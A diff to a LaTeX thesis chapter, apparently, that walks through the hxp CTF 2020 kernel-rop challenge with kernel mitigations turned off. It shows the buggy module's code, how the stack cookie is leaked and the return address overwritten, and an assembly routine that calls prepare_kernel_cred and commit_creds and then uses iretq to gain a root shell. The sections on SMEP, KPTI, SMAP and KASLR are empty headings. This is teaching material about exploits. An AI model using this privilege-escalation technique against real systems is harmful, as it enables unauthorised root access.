@@ -229,7 +229,135 @@ Finer grained ASLR has been proposed as a way to make ASLR more resistantto info
 
 \chapter{Intensification of mitigation features}
 \label{ch:adding mitigation}
-\section{No mitigation}
+In this chapter, I'll show how mitigations make it harder to exploit root privileges.
+In particular, I will explore the resolution of a \emph{CTF} (wiki CTF https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/), starting from an environment without mitigations up to adding all the mitigations to solve the real CTF.
+To do this I will use a technique called \emph{ROP}(wiki) with a module having an extremely trivial and standard bug.
+\section{Setup environment}
+Our task is to exploit a vulnearable custom kernel module that is installed into the kernel on boot.
+I'll use the setup seen for the kernel in the section (dire la sezione del setup kernel) and the one for qemu (esplicitare sezione di qemu).
+Since it is a CTF, where it is usual to use a flag to prove that you are getting the admin mode, you need to add some options in the qemu setup.
+To do this, the command is also added to the qemu settings:
+\lstinline{-hdb flag.txt}
+that it puts flag.txt into /dev/sda instead of leaving the flag.txt as a normal file in the system. 
+Another important step is to find gadgets inside the kernel to be able to perform a rop chain.
+This is possible with ROPgadget (https://github.com/JonathanSalwan/ROPgadget), which searches for all possible gadgets within the kernel.
+Since this type of operation produces an enormous amount of data, it is preferable to save everything on a file that can always be consulted for the following steps.
+To perform the exploit, the executable file containing the necessary steps for the exploit must be inserted into the file system.
+\subsection{Analyzing the kernel module}
+\label{subch:hackme}
+The module contains 6 methods.
+They allow you to communicate with this module by opening \lstinline{/ dev / hackme} and reading and writing to it.
+\begin{lstlisting}
+ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
+{   
+    //...
+    int tmp[32];
+    //...
+    if ( _size > 0x1000 )
+    {
+        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
+        BUG();
+    }
+    _check_object_size(hackme_buf, _size, 0LL);
+    if ( copy_from_user(hackme_buf, data, v5) )
+        return -14LL;
+    _memcpy(tmp, hackme_buf);
+    //...
+}
+ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
+{   
+    //...
+    int tmp[32];
+    //...
+    _memcpy(hackme_buf, tmp);
+    if ( _size > 0x1000 )
+    {
+        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
+        BUG();
+    }
+    _check_object_size(hackme_buf, _size, 1LL);
+    v6 = copy_to_user(data, hackme_buf, _size) == 0;
+    //...
+}
+\end{lstlisting}
+The bug, the same in both methods, reads / writes to a buffer stack of length 0x80 bytes, but only warns of a buffer overflow if the size is greater than 0x1000. Using this bug, we can freely read / write to the kernel stack.
+
+\section{Stack cookies}
+Now, let's see what we can do with the above primitives to gain root privileges, starting with one possible mitigation feature: only cookies stack.
+
+The idea is to put the piece of code which we want the program’s flow to jump into in the userland itself. After that, we simply overwrite the return address of the function that is being called in the kernel with that address. Because the vulnerable function is a kernel function, our code - even though being in the userland - is executed under kernel mode. In this way, we have already achieved arbitrary code execution.
+For this technique to work, we will remove most of the mitigation features in the qemu run the script by removing +smep, +smap, kpti=1, kaslr, and adding nopti, nokaslr.
+\subsection{Step by step to exploit}
+First of all let's open the hackme function with the \emph{open} method. It returns a file descriptor which will be used later in the next steps.
+Using a \emph{read} function, we're going to read the stack.
+The \emph{buffer} in the stack itself is 0x80 bytes long and the stack cookie is immediately after it. Therefore, if we read the data in an unsigned long array (of which each element is 8 bytes), the cookie will be at offset 16.
+To overwrite the return address, the same procedure is carried out for leaking, overwriting the cookie with ours. Note, however, that after the cookie there are 3 registers \emph{rbx, r12, and rbp} (different in the userland because the only rbp appears).
+This involves inserting three dummy values after our cookie and inserting the return address we want our program to return to, which corresponds to the function we will create in the user area to get root privileges.
+\subsection{Getting root privileges}
+Our goal is to get root privileges on the system.
+This can be done through two functions that already reside in the same kernel-space code: commit_creds () and prepare_kernel_cred ().
+Since KASLR is disabled, the addresses where the functions reside are constant at every start. So we can get those addresses by reading the \emph{/proc/kallsyms} file with the following terminal commands:
+\begin{lstlisting}
+cat /proc/kallsyms | grep commit_creds
+-> ffffffff814c6410 T commit_creds
+cat /proc/kallsyms | grep prepare_kernel_cred
+-> ffffffff814c67f0 T prepare_kernel_cred}
+\end{lstlisting}
+Then to get root privileges you need to write a code where the two functions are called consecutively using the return value of one as a parameter of the other.
+At this point, we need to recall an instruction that allows you to return to userland.
+This can be done with \emph{iretq} or \emph{sysretq}.
+With iretq it is much simpler as you need to configure the stack with 5 user area registry values in this order:\emph{RIP | CS | RFLAGS | SP | SS}.
+For the RIP, we can set the address of the function that allows you to open a shell, while for the others you need to enter values that return to a state before entering kernel mode.
+The best solution, therefore, is to save the state of the registers before entering kernel mode and reload them after obtaining root privileges.
+\begin{lstlisting}
+void save_state(){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov user_cs, cs;"
+        "mov user_ss, ss;"
+        "mov user_sp, rsp;"
+        "pushf;"
+        "pop user_rflags;"
+        ".att_syntax;"
+    );
+    puts("[*] Saved state");
+}
+\end{lstlisting}
+Before iretq, it is appropriate to invoke the \emph{swapgs} instruction because syscall does not change RSP to point to the kernel stack (and it does not save RSP user space anywhere). So some kind of thread-local (or core-local) storage is needed so that each core can get the correct kernel stack pointer for the task running on that core.
+A possible code to gain root privileges is:
+\begin{lstlisting}
+unsigned long user_rip = (unsigned long)get_shell;
+void escalate_privs(void){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
+        "xor rdi, rdi;"
+      "call rax; mov rdi, rax;"
+      "movabs rax, 0xffffffff814c6410;" //commit_creds
+      "call rax;"
+        "swapgs;"
+        "mov r15, user_ss;"
+        "push r15;"
+        "mov r15, user_sp;"
+        "push r15;"
+        "mov r15, user_rflags;"
+        "push r15;"
+        "mov r15, user_cs;"
+        "push r15;"
+        "mov r15, user_rip;"
+        "push r15;"
+        "iretq;"
+        ".att_syntax;"
+    );
+}
+\end{lstlisting}
+\section{Adding SMEP}
+
+\section{Adding KPTI}
+
+\section{Adding SMAP}
+
+\section{Adding KASLR and FG-KASLR}
 \end{document}
 
 
